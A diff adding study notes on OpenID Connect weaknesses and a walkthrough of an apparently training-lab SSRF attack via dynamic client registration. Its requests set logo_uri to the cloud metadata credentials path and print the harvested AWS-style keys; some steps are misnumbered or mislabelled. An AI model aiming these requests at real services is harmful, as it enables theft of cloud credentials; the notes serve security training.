@@ -347,6 +347,43 @@ If OpenID connect is actively being used by the client application, this should 
 
 As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint `/.well-known/openid-configuration`. 
 
+### Unprotected dynamic client registration
+
+If dynamic client registration is supported, the client application can register itself by sending a POST request to a dedicated /registration endpoint. The name of this endpoint is usually provided in the configuration file and documentation.
+
+In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on. A typical registration request may look something like this: 
+
+```json
+POST /openid/register HTTP/1.1
+Content-Type: application/json
+Accept: application/json
+Host: oauth-authorization-server.com
+Authorization: Bearer ab12cd34ef56gh89
+
+{
+    "application_type": "web",
+    "redirect_uris": [
+        "https://client-app.com/callback",
+        "https://client-app.com/callback2"
+        ],
+    "client_name": "My Application",
+    "logo_uri": "https://client-app.com/logo.png",
+    "token_endpoint_auth_method": "client_secret_basic",
+    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
+    "userinfo_encrypted_response_alg": "RSA1_5",
+    "userinfo_encrypted_response_enc": "A128CBC-HS256",
+    …
+}
+```
+
+
+### Allowing authorization requests by reference
+Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. If this feature is supported, you can send a single request_uri parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values. Depending on the configuration of the OAuth service, this request_uri parameter is another potential vector for SSRF. 
+
+ You might also be able to use this feature to bypass validation of these parameter values. Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the redirect_uri.
+
+To check whether this option is supported, you should look for the request_uri_parameter_supported option in the configuration file and documentation. Alternatively, you can just try adding the request_uri parameter to see if it works
+
 # Labs 
 
 ## Lab: Authentication bypass via OAuth implicit flow
@@ -425,4 +462,86 @@ Combininig all the payloads
 
     ```
 4. Once you load the attack use the access token on authorizatoion header and get the administrators api key.
+
+
+
+## Lab: SSRF via OpenID dynamic client registration
+
+1. Firstly open the site and try to iniate the OAuth authentication.
+2. Head over to the following url `https://Your-OAuth-ID.oauth-server.net/.well-known/openid-configuration`
+3. You can notice `/reg` is being used for registration
+4. Now send the following request
+    ```
+    POST / reg HTTP / 2
+    Host: oauth - 0 a070088030c62d980d301e6026b00be.oauth - server.net
+    User - Agent: Mozilla / 5.0(X11; Linux x86_64; rv: 139.0) Gecko / 20100101 Firefox / 139.0
+    Accept: */*  
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: https://0aa900f604a9f208808c4956001000a1.web-security-academy.net/
+    Authorization: Bearer Og6IpqONRFuYQUjV0BKB5m9HPD5YGTyLDb2YMZaWybZ
+    Content-Type: application/json
+    Origin: https://0aa900f604a9f208808c4956001000a1.web-security-academy.net
+    Sec-Fetch-Dest: empty
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Site: cross-site
+    Priority: u=4
+    Te: trailers
+    Content-Length: 187
+
+    {
+        "redirect_uris" : [
+            "https://xqresf7gzvogghkferv2no4jgam1aryg.oastify.com"
+        ]
+    }
+
+    ```
+5. You should get response with a ```client_id```
+6. Here we can visit over `https://YOUR-OAuth-ID.oauth-server.net/client/CLIENT_TOKEN/logo`
+7. Next we can submit something like 
+    ```
+    POST / reg HTTP / 2
+    Host: oauth - 0 a070088030c62d980d301e6026b00be.oauth - server.net
+    User - Agent: Mozilla / 5.0(X11; Linux x86_64; rv: 139.0) Gecko / 20100101 Firefox / 139.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: https://0aa900f604a9f208808c4956001000a1.web-security-academy.net/
+    Authorization: Bearer Og6IpqONRFuYQUjV0BKB5m9HPD5YGTyLDb2YMZaWybZ
+    Content-Type: application/json
+    Origin: https://0aa900f604a9f208808c4956001000a1.web-security-academy.net
+    Sec-Fetch-Dest: empty
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Site: cross-site
+    Priority: u=4
+    Te: trailers
+    Content-Length: 187
+
+    {
+        "redirect_uris" : [
+            "https://xqresf7gzvogghkferv2no4jgam1aryg.oastify.com"
+        ],
+    "logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+    }
+
+    ```
+7. Now visiting the https://Your-OAuth-ID.oauth-server.net/.well-known/openid-configuration you should get something like 
+    ```json
+    HTTP/2 200 OK
+    X-Powered-By: Express
+    Content-Type: application/json; charset=utf-8
+    Date: Mon, 02 Jun 2025 09:30:44 GMT
+    Keep-Alive: timeout=5
+    Content-Length: 530
+
+    {
+        "Code" : "Success",
+        "LastUpdated" : "2025-06-02T09:22:08.126268102Z",
+        "Type" : "AWS-HMAC",
+        "AccessKeyId" : "m2Y9xD7dMqQ4x8sZIlru",
+        "SecretAccessKey" : "KApg1LRKH4nKQC4RdF63pzdLmNMfaNXXTU66rxop",
+        "Token" : "zdVldgsphuDvqhdrpaDjBLlj0duJvI9kki26kluF7THIH0qmtzzlBhu0Voh9QrZMqor47wfkDaFdcXLeFvGw3EIkWo57lEWbsDqdT7TEf2otHZCQi3eoRs2GQz7GNw7DJVdJy7Ev8omiuE6ldP6hjHIXIYipcurcwIba4DGFmpBeohI5Yc7IHyPXgUzlHqmLR1QDH0JsT0xzZ53M2tzCfZQYOAxWBYdbAqN09PApUA5uyydbl9ISw4JtOkpJ63dk",
+        "Expiration" : "2031-06-01T09:22:08.126268102Z"
+    }
+    ```
 
